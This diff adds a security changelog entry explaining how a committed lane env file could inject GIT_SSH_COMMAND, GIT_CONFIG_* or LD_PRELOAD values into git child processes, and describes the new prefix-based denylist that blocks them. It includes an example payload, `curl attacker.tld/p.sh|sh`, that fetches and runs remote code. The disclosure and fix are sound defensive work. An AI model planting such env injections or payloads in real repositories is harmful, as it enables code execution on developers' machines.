@@ -1,0 +1,65 @@
+# Security: repo-resident lane env files can no longer set GIT_* or loader-hijack vars
+
+## What changed
+
+`.swarm/lanes/<N>.env` lives inside the repository worktree, so a hostile
+repository can simply commit one. Both lane-env parsers —
+`readLaneEnvFileFromDiskSync` (src/git/branch.ts, feeds `gitExec` /
+`commitAndPush` git child processes) and `readLaneEnvFileFromDisk`
+(src/hooks/delegation-gate/worktree-isolation.ts, the async twin) — previously
+validated only key *shape* (`isValidEnvKey`). Shape-valid but hostile keys
+flowed straight into git child-process environments:
+
+- `GIT_SSH_COMMAND` — `curl attacker.tld/p.sh|sh` executes on the next git
+  operation spawned with a lane env
+- `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n` — sets
+  `core.sshCommand` or `core.pager` indirectly
+- `GIT_EXTERNAL_DIFF`, `GIT_TEMPLATE_DIR`, … — the whole `GIT_*` config surface
+- `LD_PRELOAD` / `LD_LIBRARY_PATH` / `DYLD_*` — loader hijacking
+
+Both parsers now drop every `GIT_*`, `LD_*`, and `DYLD_*` key via a new shared
+`isUntrustedEnvKey` predicate (src/sandbox/executor.ts, beside
+`isValidEnvKey`) before the key reaches any child environment. Matching is
+prefix-based and case-insensitive (Windows resolves env names
+case-insensitively, so `git_ssh_command` must not slip through). The read sites
+now carry an explicit "UNTRUSTED INPUT" comment recording that the file is
+repo-resident and therefore attacker-controlled.
+
+## Why
+
+Found during the security review of #2261 (issue #2236); reported as #2263.
+The disk-read fallback is only reachable today through `runPRWorkflow` /
+`commitAndPush`, which have no production callers — so the chain is latent,
+not live. But it is a true repo-to-code-execution primitive the day
+`runPRWorkflow` gets wired up or reached through an untraced dispatch path,
+and the shape-only validation read as sufficient when it was not. Blocking the
+families at the parse boundary hardens every current and future consumer of
+the file uniformly.
+
+Prefix matching over exact names is deliberate: enumerating "the bad ones"
+inside `GIT_*` loses the race against git's growing config-env surface, and a
+lane profile (PORT / TMPDIR / cache redirects) has no legitimate reason to
+touch git's control plane at all. `GITHUB_*` is intentionally not blocked —
+those are data-plane tokens (e.g. `GITHUB_TOKEN`) routinely passed to CLI
+children, not git controls.
+
+## Migration steps
+
+None. Legitimate lane profiles (PORT, TMPDIR, cache-redirect vars,
+`GITHUB_TOKEN`) are unaffected; only git-control and loader-hijack keys are
+dropped, and no legit lane profile ever needed them. A lane that genuinely
+relies on a `GIT_*` env var today would need to pass it via the lane
+provisioning config (`runtime_isolation.env_overrides` from user config)
+rather than the repo-resident file — which is the correct trust boundary,
+since user config is trusted and the worktree file is not.
+
+## Known caveats
+
+- The denylist is fail-open for *unknown* families by design (it blocks the
+  `GIT_*`/`LD_*`/`DYLD_*` primitives, not every conceivable env var). The
+  file's contents remain attacker-controlled; only the known code-execution
+  families are dropped at parse time.
+- The writer (`writeLaneProfileToDiskReal`, src/worktree/core.ts) still
+  accepts any shape-valid key from trusted user config; the denylist guards
+  the repo-resident read side, which is the untrusted boundary. If a user's
+  own `env_overrides` contain `GIT_*`, those still flow (trusted source).
